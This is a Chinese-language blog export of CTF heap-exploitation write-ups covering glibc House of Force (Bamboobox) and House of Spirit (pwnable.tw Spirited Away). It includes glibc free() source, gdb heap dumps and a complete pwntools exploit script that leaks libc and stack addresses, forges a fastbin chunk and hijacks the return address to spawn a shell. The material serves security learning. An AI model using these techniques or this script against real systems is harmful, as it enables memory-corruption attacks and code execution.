<h3 id="3-添加-item1"><a href="#3-添加-item1" class="headerlink" title="3) 添加 item1"></a>3) 添加 item1</h3><p>程序调用 malloc 在 top chunk 中分配一块大内存给 name ，此时更新 top chunk ptr 将会触发整数溢出，从而控制 top chunk 转移到指定内存。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ heapls</div><div class="line">           ADDR             SIZE            STATUS</div><div class="line">sbrk_base  0x603000</div><div class="line">chunk      0x603000         0x68            (top)</div><div class="line">sbrk_end   0x624000</div><div class="line">gdb-peda$ x/20x 0x603000</div><div class="line">0x603000:       0x0000000000000000      0x0000000000000069</div><div class="line">0x603010:       0x0000000000400896      0x00000000004008b1</div><div class="line">0x603020:       0x0000000000000000      0x0000000000000051</div><div class="line">0x603030:       0x6161616161616161      0x6161616161616161</div><div class="line">0x603040:       0x6161616161616161      0x6161616161616161</div><div class="line">0x603050:       0x6161616161616161      0x6161616161616161</div><div class="line">0x603060:       0x6161616161616161      0x6161616161616161</div><div class="line">0x603070:       0x0000000000000000      0xffffffffffffff91</div><div class="line">0x603080:       0x0000000000000000      0x0000000000000000</div><div class="line">0x603090:       0x0000000000000000      0x0000000000000000</div></pre></td></tr></table></figure></p>
<h3 id="4-再次添加-item2"><a href="#4-再次添加-item2" class="headerlink" title="4) 再次添加 item2"></a>4) 再次添加 item2</h3><p>malloc(0x20) 从新的 top chunk 中分配一块内存给 item 的 name，rax 中返回的起始地址为 0x603010，该内存块会包含 box 结构体所在的 chunk。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ heapls                                                                           </div><div class="line">           ADDR             SIZE            STATUS</div><div class="line">sbrk_base  0x603000</div><div class="line">chunk      0x603000         0x30            (inuse)</div><div class="line">chunk      0x603030         0x38            (top)</div><div class="line">sbrk_end   0x624000</div><div class="line">gdb-peda$ info reg rax</div><div class="line">rax            0x603010 0x603010</div><div class="line">gdb-peda$ x/20x 0x603000                                                                   </div><div class="line">0x603000:       0x0000000000000000      0x0000000000000031</div><div class="line">0x603010:       0x0000000000400896      0x00000000004008b1</div><div class="line">0x603020:       0x0000000000000000      0x0000000000000051</div><div class="line">0x603030:       0x6161616161616161      0x0000000000000039</div><div class="line">0x603040:       0x6161616161616161      0x6161616161616161</div><div class="line">0x603050:       0x6161616161616161      0x6161616161616161</div><div class="line">0x603060:       0x6161616161616161      0x6161616161616161</div><div class="line">0x603070:       0x0000000000000000      0x00ffffffffffff91</div><div class="line">0x603080:       0x0000000000000000      0x0000000000000000</div><div class="line">0x603090:       0x0000000000000000      0x0000000000000000</div></pre></td></tr></table></figure></p>
<p>之后将 magic 函数地址作为 item2 的 name 写入到新分配的 chunk 中，覆盖 box 结构体中的函数指针，进行劫持程序执行流程。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/20x 0x603000                                                        </div><div class="line">0x603000:       0x0000000000000000      0x0000000000000031</div><div class="line">0x603010:       0x0000000000400d49      0x0000000000400d49</div><div class="line">0x603020:       0x000000000000000a      0x0000000000000051</div><div class="line">0x603030:       0x6161616161616161      0x0000000000000039</div><div class="line">0x603040:       0x6161616161616161      0x6161616161616161</div><div class="line">0x603050:       0x6161616161616161      0x6161616161616161</div><div class="line">0x603060:       0x6161616161616161      0x6161616161616161</div><div class="line">0x603070:       0x0000000000000000      0x00ffffffffffff91</div><div class="line">0x603080:       0x0000000000000000      0x0000000000000000</div><div class="line">0x603090:       0x0000000000000000      0x0000000000000000</div><div class="line">gdb-peda$ telescope 0x400d49</div><div class="line">0000| 0x400d49 (&lt;magic&gt;:        push   rbp)</div><div class="line">0008| 0x400d51 (&lt;magic+8&gt;:      mov    rax,QWORD PTR fs:0x28)</div><div class="line">0016| 0x400d59 (&lt;magic+16&gt;:     add    BYTE PTR [rax-0x77],cl)</div><div class="line">0024| 0x400d61 (&lt;magic+24&gt;:     add    BYTE PTR [rax],al)</div><div class="line">0032| 0x400d69 (&lt;magic+32&gt;:     add    BYTE PTR [rax+0x0],bh)</div><div class="line">0040| 0x400d71 (&lt;magic+40&gt;:     stc)</div><div class="line">0048| 0x400d79 (&lt;magic+48&gt;:     rex.WRB xchg r8,rax)</div><div class="line">0056| 0x400d81 (&lt;magic+56&gt;:     add    BYTE PTR [rax],al)</div></pre></td></tr></table></figure></p>
<h3 id="5-退出程序"><a href="#5-退出程序" class="headerlink" title="5) 退出程序"></a>5) 退出程序</h3><p>退出程序时会调用 goodbye_message 函数，从而执行 magic 输出 flag。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">[DEBUG] Sent 0x2 bytes:</div><div class="line">    <span class="string">'5\n'</span></div><div class="line">[DEBUG] Received 0xe0 bytes:</div><div class="line">    <span class="string">'----------------------------\n'</span></div><div class="line">    <span class="string">'Bamboobox Menu\n'</span></div><div class="line">    <span class="string">'----------------------------\n'</span></div><div class="line">    <span class="string">'1.show the items in the box\n'</span></div><div class="line">    <span class="string">'2.add a new item\n'</span></div><div class="line">    <span class="string">'3.change the item in the box\n'</span></div><div class="line">    <span class="string">'4.remove the item in the box\n'</span></div><div class="line">    <span class="string">'5.exit\n'</span></div><div class="line">    <span class="string">'----------------------------\n'</span></div><div class="line">    <span class="string">'Your choice:'</span></div><div class="line">[DEBUG] Received 0x13 bytes:</div><div class="line">    <span class="string">'flag&#123;this_is_flag&#125;\n'</span></div><div class="line">flag&#123;this_is_flag&#125;</div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] <a href="https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt" target="_blank" rel="external">The Malloc Maleficarum Glibc Malloc Exploitation Techniques</a><br>[2] <a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_force.html" target="_blank" rel="external">House of Force</a><br>[3] <a href="https://github.com/shinmao/WhyNot-HEAP-Exploitation/tree/master/House-Of-Force" target="_blank" rel="external">WhyNot-HEAP-Exploitation</a><br>[4] <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/house_of_force/" target="_blank" rel="external">CTF Wiki-house of force</a><br>[5] <a href="http://veritas501.space/2017/05/23/HITCON-training%20writeup/" target="_blank" rel="external">HITCON-training writeup</a></p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
            <tag> house-of-force </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux glibc heap house-of-spirit]]></title>
      <url>/2018/0413/linux-glibc-heap-houseofspirit/</url>
      <content type="html"><![CDATA[<p>House of Spirit 利用方法针对 fastbin 中的 chunk，该方法不修改 chunk 结构中的 metadata，而是直接控制释放 chunk 时传递给 free() 函数的指针，使其指向内存中伪造的 fake chunk，free() 函数执行时会将伪造的 chunk 放入 fastbin 中。当再次申请内存时，会返回伪造的 chunk，接着可对返回的内存写数据。</p>
<h1 id="0x01-释放-fastbin-chunk"><a href="#0x01-释放-fastbin-chunk" class="headerlink" title="0x01 释放 fastbin chunk"></a>0x01 释放 fastbin chunk</h1><h2 id="1-检查标志位"><a href="#1-检查标志位" class="headerlink" title="1. 检查标志位"></a>1. 检查标志位</h2><p>House of Spirit 利用思路是将伪造的 chunk 放入 fastbin 中，下面分析堆管理实现中释放 fastbin chunk 的过程。首先，当释放的 chunk 是由 mmap() 创建时（即 IS_MMAPPED 标志位为 1）会调用 munmap_chunk() 进行释放。而我们希望能调用 _int_free() 函数将 fake chunk 放入 fastbin，因此在伪造 chunk 时要把 IS_MMAPPED 设置为 0。此外把 NON_MAIN_ARENA 标志位也设置为 0。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// malloc.c in glibc2.23</span></div><div class="line"><span class="keyword">void</span> __libc_free (<span class="keyword">void</span> *mem)</div><div class="line">&#123;</div><div class="line">  mstate ar_ptr;</div><div class="line">  mchunkptr p;                          <span class="comment">// chunk corresponding to mem</span></div><div class="line"></div><div class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</div><div class="line">    = atomic_forced_read (__free_hook);</div><div class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</div><div class="line">    &#123;</div><div class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</div><div class="line">      <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">// free(0) has no effect</span></div><div class="line">    <span class="keyword">return</span>;</div><div class="line"></div><div class="line">  p = mem2chunk (mem);</div><div class="line">  <span class="comment">// 判断是否由 mmap 创建的 chunk</span></div><div class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                <span class="comment">// release mmapped memory.</span></div><div class="line">    &#123;</div><div class="line">      <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></div><div class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</div><div class="line">          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</div><div class="line">          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</div><div class="line">        &#123;</div><div class="line">          mp_.mmap_threshold = chunksize (p);</div><div class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</div><div class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</div><div class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</div><div class="line">        &#125;</div><div class="line">      munmap_chunk (p);   <span class="comment">// 调用 munmap_chunk 函数释放</span></div><div class="line">      <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  ar_ptr = arena_for_chunk (p);</div><div class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);   <span class="comment">// 调用 _int_free 函数释放</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="2-检查-size"><a href="#2-检查-size" class="headerlink" title="2. 检查 size"></a>2. 检查 size</h2><p>在 _int_free() 函数中，释放 chunk 时会检查该 chunk 和下一个 chunk 的 size 字段。因此，在伪造 chunk 时应满足以下条件。    </p>
<blockquote>
<p>1）fake chunk 的 size 不能超过 fastbin 中 chunk 的最大值（32bits 系统中为 64 bytes，64 bits 系统中为 128 bytes）。<br>2)  fake chunk 下一个 chunk 的 size 要大于 2 * SIZE_SZ（ SIZE_SZ ，32bits 系统中为 4 bytes，64 bits 系统中为 8 bytes），小于 av-&gt;system_mem（132kb，即 0x21000 bytes）。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* malloc.c in glibc2.23 */</span></div><div class="line"><span class="keyword">static</span> <span class="keyword">void</span> _int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock) &#123;</div><div class="line">     mchunkptr       p;           <span class="comment">/* chunk corresponding to mem */</span></div><div class="line">     INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></div><div class="line">     mfastbinptr*    fb;          <span class="comment">/* associated fastbin */</span></div><div class="line">     ...</div><div class="line">     p = mem2chunk(mem);</div><div class="line">     size = chunksize(p);</div><div class="line">     ...</div><div class="line">     <span class="comment">// fake chunk 的 size 不能超过 fastbin 中 chunk 的最大值</span></div><div class="line">     <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</div><div class="line">          &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top) &#123;</div><div class="line">       <span class="comment">// fake chunk 下一个 chunk 的 size 要大于 2 * SIZE_SZ，小于 av-&gt;system_mem</span></div><div class="line">       <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</div><div class="line">           || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</div><div class="line">           …</div><div class="line">           errstr = <span class="string">"free(): invalid next size (fast)"</span>;</div><div class="line">           <span class="keyword">goto</span> errout;</div><div class="line">         &#125;</div><div class="line">       ...</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
<p> 若伪造的 chunk 能满足以上几个条件，便能成功欺骗 free() 函数把 fake chunk 放入 fastbin 中，当再次申请合适大小的内存时将返回 fake chunk，进而控制目标内存。    </p>
<h1 id="0x2-利用思路"><a href="#0x2-利用思路" class="headerlink" title="0x2 利用思路"></a>0x2 利用思路</h1><p>下面是一个利用场景：程序中存在栈溢出漏洞，溢出长度不足以覆盖栈中返回地址等目标内存，但是能覆盖栈中一个即将被 free 的堆指针 ptr。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-4-12/35769818.jpg" alt=""><br>利用思路如下：    </p>
<blockquote>
<p>1）在可控区域 1 中伪造一个 chunk，伪造的 chunk 应满足上述条件，并确保该 chunk 能覆盖目标内存区域；<br>2)  为了知道 fake chunk 的地址，需泄露栈地址。之后通过栈溢出等漏洞修改即将释放的堆指针 ptr，使其指向 <code>fake chunk + 2*size_t</code>（prev_size 和 size 字段的大小，32 bits 系统中为 4 bytes，64 bits 系统中为 8 bytes）；<br>3）执行 free(ptr) 释放 ptr，fake chunk 被放入 fastbin 中；<br>4）使用 malloc 申请合适大小的内存，此时将返回刚释放的 fake chunk，使得目标区域可控。    </p>
</blockquote>
<h1 id="0x03-实例分析"><a href="#0x03-实例分析" class="headerlink" title="0x03 实例分析"></a>0x03 实例分析</h1><p>下面以 pwnable.tw 中的 Spirited Away 为例分析该利用方法。程序和 exp 可在 <a href="https://github.com/0x4C43/Linux-Exploit/tree/master/heap_house-of-spirit" target="_blank" rel="external">github</a>下载。   </p>
<h2 id="1-漏洞"><a href="#1-漏洞" class="headerlink" title="1. 漏洞"></a>1. 漏洞</h2><p>程序中存在以下两个漏洞。</p>
<h3 id="1）缓存区溢出"><a href="#1）缓存区溢出" class="headerlink" title="1）缓存区溢出"></a>1）缓存区溢出</h3><p>程序中调用 sprintf 函数时存在溢出漏洞，变量 v1 为 56 bytes，当评论数量 cnt 达到 3 位数时会溢出（54+3 &gt; 56），导致其相邻变量 nbytes 被覆盖。利用该漏洞可将 nbytes 修改为 110（“n”的 ASCII 值为 0x6e），由于 nbytes 控制着 name 和 comment 的输入长度，从而又一次产生溢出漏洞。</p>
<h3 id="2）信息泄露"><a href="#2）信息泄露" class="headerlink" title="2）信息泄露"></a>2）信息泄露</h3><p>此外，还存在一个信息泄露漏洞，由于栈中变量 reason 未初始化，输出 reason 时会把栈中数据一起输出。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">survey</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> v1; <span class="comment">// [esp+10h] [ebp-E8h]   // 56 bytes</span></div><div class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+48h] [ebp-B0h]</span></div><div class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// [esp+4Ch] [ebp-ACh]</span></div><div class="line">  <span class="keyword">char</span> comment; <span class="comment">// [esp+50h] [ebp-A8h]   // 80 bytes</span></div><div class="line">  <span class="keyword">int</span> age; <span class="comment">// [esp+A0h] [ebp-58h]</span></div><div class="line">  <span class="keyword">void</span> *name; <span class="comment">// [esp+A4h] [ebp-54h]   // 指向内存空间为 60 bytes的堆指针</span></div><div class="line">  <span class="keyword">int</span> reason; <span class="comment">// [esp+A8h] [ebp-50h]    // 80 bytes</span></div><div class="line"></div><div class="line">  nbytes = <span class="number">60</span>;    <span class="comment">// 控制name 和 comment的输入长度</span></div><div class="line">  v3 = <span class="number">80</span>;</div><div class="line">LABEL_2:</div><div class="line">  <span class="built_in">memset</span>(&amp;comment, <span class="number">0</span>, <span class="number">80u</span>);   <span class="comment">// reason未初始化</span></div><div class="line">  name = <span class="built_in">malloc</span>(<span class="number">60u</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"\nPlease enter your name: "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  read(<span class="number">0</span>, name, nbytes);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Please enter your age: "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;age);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Why did you came to see this movie? "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  read(<span class="number">0</span>, &amp;reason, v3);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Please enter your comment: "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  read(<span class="number">0</span>, &amp;comment, nbytes);</div><div class="line">  ++cnt;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Name: %s\n"</span>, name);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Age: %d\n"</span>, age);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Reason: %s\n"</span>, &amp;reason);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Comment: %s\n\n"</span>, &amp;comment);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="built_in">sprintf</span>(&amp;v1, <span class="string">"%d comment so far. We will review them as soon as we can"</span>, cnt);  <span class="comment">// overflow</span></div><div class="line">  <span class="built_in">puts</span>(&amp;v1);</div><div class="line">…</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="2-利用脚本"><a href="#2-利用脚本" class="headerlink" title="2. 利用脚本"></a>2. 利用脚本</h2><p>完整的利用脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*-coding:utf-8-*-</span></div><div class="line"><span class="comment"># author: 0x4C43</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./spirited_away'</span>)</div><div class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</div><div class="line"></div><div class="line">p = process(<span class="string">'./spirited_away'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment1</span><span class="params">(name,age,reason,comment)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'name: '</span>)</div><div class="line">    p.send(name)</div><div class="line">    p.recvuntil(<span class="string">'age: '</span>)</div><div class="line">    p.sendline(age)</div><div class="line">    p.recvuntil(<span class="string">'movie? '</span>)</div><div class="line">    p.send(reason)</div><div class="line">    p.recvuntil(<span class="string">'comment: '</span>)</div><div class="line">    p.send(comment)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment2</span><span class="params">(age,reason)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'age: '</span>)</div><div class="line">    p.sendline(age)</div><div class="line">    p.recvuntil(<span class="string">'movie? '</span>)</div><div class="line">    p.sendline(reason)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaklibc</span><span class="params">()</span>:</span></div><div class="line">    comment1(<span class="string">"BBBB"</span>,<span class="string">"20"</span>,<span class="number">24</span>*<span class="string">"B"</span>,<span class="string">"BBBB"</span>)</div><div class="line">    p.recvuntil(<span class="string">'Reason: '</span>)</div><div class="line">    p.recv(<span class="number">24</span>)</div><div class="line">    addr = u32(p.recv(<span class="number">4</span>))</div><div class="line">    <span class="keyword">print</span> hex(addr)</div><div class="line">    libc_base = addr -libc.symbols[<span class="string">'_IO_file_sync'</span>]<span class="number">-7</span></div><div class="line">    p.recvuntil(<span class="string">'&lt;y/n&gt;: '</span>)</div><div class="line">    p.send(<span class="string">'y'</span>)</div><div class="line">    <span class="keyword">return</span> libc_base</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakstack</span><span class="params">()</span>:</span></div><div class="line">    comment1(<span class="string">"BBBB"</span>,<span class="string">"20"</span>,<span class="number">80</span>*<span class="string">"B"</span>,<span class="string">"BBBB"</span>)</div><div class="line">    p.recvuntil(<span class="string">'Reason: '</span>)</div><div class="line">    p.recv(<span class="number">80</span>)</div><div class="line">    addr = u32(p.recv(<span class="number">4</span>))</div><div class="line">    p.recvuntil(<span class="string">'&lt;y/n&gt;: '</span>)</div><div class="line">    p.send(<span class="string">'y'</span>)</div><div class="line">    <span class="keyword">return</span> addr</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fakechunk</span><span class="params">(stack)</span>:</span></div><div class="line">    fake_chunk = <span class="string">"DDDD"</span>        <span class="comment"># prev_size</span></div><div class="line">    fake_chunk += p32(<span class="number">0x41</span>)    <span class="comment"># size</span></div><div class="line">    fake_chunk += (<span class="number">0x40</span><span class="number">-8</span>)*<span class="string">"D"</span></div><div class="line">    fake_chunk += p32(<span class="number">0</span>)  </div><div class="line">    fake_chunk += p32(<span class="number">0x41</span>)    <span class="comment"># next chunk size</span></div><div class="line"></div><div class="line">    fake_chunk_ptr = stack - <span class="number">0x70</span> + <span class="number">8</span></div><div class="line">    comment  = <span class="string">"D"</span> * <span class="number">0x50</span></div><div class="line">    comment += p32(<span class="number">0x00</span>)       <span class="comment"># fake age</span></div><div class="line">    comment += p32(fake_chunk_ptr) <span class="comment"># overwrite name ptr</span></div><div class="line"></div><div class="line">    comment1(<span class="string">"DDDD"</span>,<span class="string">"40"</span>,fake_chunk, comment)</div><div class="line">    p.recvuntil(<span class="string">'&lt;y/n&gt;: '</span>)</div><div class="line">    p.send(<span class="string">'y'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    raw_input(<span class="string">'add 100 comment to overwrite nbytes'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">        comment1(<span class="string">"AAAA"</span>,<span class="string">"10"</span>,<span class="string">"AAAA"</span>,<span class="string">"AAAA"</span>)</div><div class="line">        p.recvuntil(<span class="string">'&lt;y/n&gt;: '</span>)</div><div class="line">        p.sendline(<span class="string">'y'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>):</div><div class="line">        comment2(<span class="string">"10"</span>,<span class="string">"AAAA"</span>)</div><div class="line">        p.recvuntil(<span class="string">'&lt;y/n&gt;: '</span>)</div><div class="line">        p.send(<span class="string">'y'</span>)   </div><div class="line"></div><div class="line">    raw_input(<span class="string">'leak system_addr'</span>)</div><div class="line">    libc_base = leaklibc()</div><div class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</div><div class="line">    binsh_addr = libc_base + next(libc.search(<span class="string">'sh\0'</span>))</div><div class="line">    log.success(<span class="string">"system_addr: &#123;&#125;"</span>.format(hex(system_addr)))</div><div class="line">    log.success(<span class="string">"binsh_addr: &#123;&#125;"</span>.format(hex(binsh_addr)))</div><div class="line"></div><div class="line">    raw_input(<span class="string">'leak stack address'</span>)</div><div class="line">    stack_addr = leakstack()</div><div class="line">    log.success(<span class="string">"stack_addr: &#123;&#125;"</span>.format(hex(stack_addr)))</div><div class="line"></div><div class="line">    raw_input(<span class="string">'overflow return addr to exec system("/bin/sh")'</span>)   </div><div class="line">    <span class="comment"># add fake chunk to fastbin</span></div><div class="line">    fakechunk(stack_addr)</div><div class="line">    <span class="comment"># alloc fake chunk to name, and overwrite return addr of survey</span></div><div class="line">    name = <span class="number">76</span>*<span class="string">"E"</span> + p32(system_addr) + <span class="string">"EEEE"</span> + p32(binsh_addr)</div><div class="line">    comment1(name,<span class="string">"50"</span>,<span class="string">"EEEE"</span>,<span class="string">"EEEE"</span>)</div><div class="line">    p.recvuntil(<span class="string">'&lt;y/n&gt;: '</span>)</div><div class="line">    p.send(<span class="string">'n'</span>)</div><div class="line">    p.interactive()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
<h2 id="3-利用过程"><a href="#3-利用过程" class="headerlink" title="3. 利用过程"></a>3. 利用过程</h2><p>1）首先添加 100 条评论，使得 v1 溢出修改 nbytes 为 0x6e。nbytes 被修改前内存中地址如下：<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-4-12/46175149.jpg" alt=""><br>nbytes 被修改后内存中地址如下：<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-4-12/70375310.jpg" alt="">    </p>
